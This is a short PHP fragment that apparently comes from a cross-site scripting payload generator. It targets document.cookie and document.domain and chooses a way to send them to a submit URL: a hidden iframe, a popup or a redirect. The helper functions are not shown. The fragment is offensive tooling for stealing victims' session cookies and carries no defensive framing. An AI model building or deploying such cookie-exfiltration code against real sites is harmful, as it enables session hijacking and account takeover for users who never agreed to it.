<?php

$data = array(
  "c" => "document.cookie",
  "d" => "document.domain"
);

switch($extraction)
{
  case "iframe":
    $result = sendWithIFRAME($submitURL, $data, $quotes);
    break;
  case "popup":
    $result = sendWithPopup($submitURL, $data, $quotes);
    break;
  case "redirect":
    $result = sendWithRedirection($submitURL, $data, $quotes);
    break;
  default:
    $result = "Nice try ;)";
}

?>
